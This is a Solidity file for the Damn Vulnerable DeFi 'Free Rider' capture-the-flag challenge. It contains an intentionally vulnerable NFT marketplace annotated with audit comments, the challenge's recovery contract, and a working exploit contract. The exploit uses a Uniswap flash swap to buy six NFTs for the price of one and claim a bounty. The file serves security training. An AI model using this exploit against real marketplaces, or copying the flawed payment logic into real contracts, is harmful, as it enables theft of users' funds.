// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { console2 } from "@dev/forge-std/console2.sol";
import { IWETH } from "@contracts/CTF/Damn-Vulnerable-DeFi/00.Base/WETH9.sol";
import { IERC721 } from "@openzeppelin/contracts-v4.7.1/token/ERC721/IERC721.sol";
import { Address } from "@openzeppelin/contracts-v4.7.1/utils/Address.sol";
import { ReentrancyGuard } from "@openzeppelin/contracts-v4.7.1/security/ReentrancyGuard.sol";
import { IERC721Receiver } from "@openzeppelin/contracts-v4.7.1/token/ERC721/IERC721Receiver.sol";

import { DamnValuableNFT } from "@contracts/CTF/Damn-Vulnerable-DeFi/00.Base/DamnValuableNFT.sol";
import { IUniswapV2Callee } from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import { IUniswapV2Pair } from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {
    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public offersCount;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);

    error InvalidPricesAmount();
    error InvalidTokensAmount();
    error InvalidPrice();
    error CallerNotOwner(uint256 tokenId);
    error InvalidApproval();
    error TokenNotOffered(uint256 tokenId);
    error InsufficientPayment();

    constructor(uint256 amount) payable {
        DamnValuableNFT _token = new DamnValuableNFT();
        _token.renounceOwnership();
        for (uint256 i = 0; i < amount;) {
            _token.safeMint(msg.sender);
            unchecked {
                ++i;
            }
        }
        token = _token;
    }

    function offerMany(uint256[] memory tokenIds, uint256[] memory prices) external nonReentrant {
        uint256 amount = tokenIds.length;
        if (amount == 0) {
            revert InvalidTokensAmount();
        }

        if (amount != prices.length) {
            revert InvalidPricesAmount();
        }

        for (uint256 i = 0; i < amount;) {
            unchecked {
                _offerOne(tokenIds[i], prices[i]);
                ++i;
            }
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        DamnValuableNFT _token = token; // gas savings

        if (price == 0) {
            revert InvalidPrice();
        }

        if (msg.sender != _token.ownerOf(tokenId)) {
            revert CallerNotOwner(tokenId);
        }

        if (_token.getApproved(tokenId) != address(this) && !_token.isApprovedForAll(msg.sender, address(this))) {
            revert InvalidApproval();
        }

        offers[tokenId] = price;

        assembly {
            // gas savings
            sstore(0x02, add(sload(0x02), 0x01))
        }

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length;) {
            unchecked {
                _buyOne(tokenIds[i]);
                ++i;
            }
        }
    }

    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0) {
            revert TokenNotOffered(tokenId);
        }

        // @audit-issue I can purchase 6 NFTs while paying only for one
        // @audit-info msg.value doesn't change even if we sent the ETH out
        if (msg.value < priceToPay) {
            revert InsufficientPayment();
        }

        --offersCount;

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        // @audit-issue Medium / High seller can revoke the token spending approval
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // @audit-issue Eth is being send to the buyer instead of the seller
        // @audit-info This happens because we transfered the token before sending the ETH and changed it's ownership
        // pay seller using cached token
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }

    receive() external payable { }
}

contract FreeRiderRecovery is ReentrancyGuard, IERC721Receiver {
    using Address for address payable;

    uint256 private constant PRIZE = 45 ether;
    address private immutable beneficiary;
    IERC721 private immutable nft;
    uint256 private received;

    error NotEnoughFunding();
    error CallerNotNFT();
    error OriginNotBeneficiary();
    error InvalidTokenID(uint256 tokenId);
    error StillNotOwningToken(uint256 tokenId);

    constructor(address _beneficiary, address _nft) payable {
        if (msg.value != PRIZE) {
            revert NotEnoughFunding();
        }
        beneficiary = _beneficiary;
        nft = IERC721(_nft);
        IERC721(_nft).setApprovalForAll(msg.sender, true);
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory _data
    )
        external
        override
        nonReentrant
        returns (bytes4)
    {
        if (msg.sender != address(nft)) {
            revert CallerNotNFT();
        }

        if (tx.origin != beneficiary) {
            revert OriginNotBeneficiary();
        }

        if (_tokenId > 5) {
            revert InvalidTokenID(_tokenId);
        }

        if (nft.ownerOf(_tokenId) != address(this)) {
            revert StillNotOwningToken(_tokenId);
        }

        if (++received == 6) {
            address recipient = abi.decode(_data, (address));
            payable(recipient).sendValue(PRIZE);
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}

contract FreeRiderHack is IUniswapV2Callee {
    IUniswapV2Pair private immutable pair;
    FreeRiderNFTMarketplace private immutable marketplace;

    IWETH private immutable weth;
    IERC721 private immutable nft;

    address private immutable recoveryContract;
    address private immutable player;

    uint256 private constant NFT_PRICE = 15 ether;
    uint256[] private tokens = [0, 1, 2, 3, 4, 5];

    constructor(address _pair, address payable _marketplace, address _weth, address _nft, address _recoveryContract) {
        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        recoveryContract = _recoveryContract;
        player = msg.sender;
    }

    function attack() external payable {
        console2.log("Beofre Hacker ", address(this).balance, address(this).balance / 1e17);
        // 1. Request a flashSwap of 15 WETH from Uniswap Pair
        pair.swap(0, NFT_PRICE, address(this), abi.encode(NFT_PRICE));
        console2.log("After Hacker  ", address(this).balance, address(this).balance / 1e17);
    }

    /*
        1. player 0.1 ether => unsiwap 0.003 free => 33 ether
        2. player 15 ether price =>  6 NFT => 90 ether
        3. player sell 6 NFT to receive => 45 ether
        4. player get 90 + 45 - free
    */
    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        // 1.Access Control
        require(msg.sender == address(pair), "Only Uniswap Pair Can call");

        // 2. Unwrap WETH to native ETH
        weth.withdraw(NFT_PRICE);
        console2.log("Hacker swap withdraw", address(this).balance, address(this).balance / 1e17);

        // 3. Buy 6 NFTS for only 15 ETH total
        marketplace.buyMany{ value: NFT_PRICE }(tokens);
        console2.log("Hacker buyMany", address(this).balance, address(this).balance / 1e17);
        // 4. Pay back 15WETH + 0.3% to the pair contract
        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
        weth.deposit{ value: amountToPayBack }();
        weth.transfer(address(pair), amountToPayBack);
        console2.log("Hacker fee", address(this).balance, address(this).balance / 1e17);

        // 5. Send NFTs to recovery contract so we can get the bounty
        for (uint256 i; i < tokens.length; i++) {
            console2.log("Hacker safeTransferFrom", i, address(this).balance, address(this).balance / 1e17);
            nft.safeTransferFrom(address(this), recoveryContract, i, abi.encode(address(this)));
        }
    }

    function onERC721Received(address, address, uint256 id, bytes memory) external view returns (bytes4) {
        console2.log("Hacker onERC721Received", id, address(this).balance, address(this).balance / 1e17);
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable { }
}
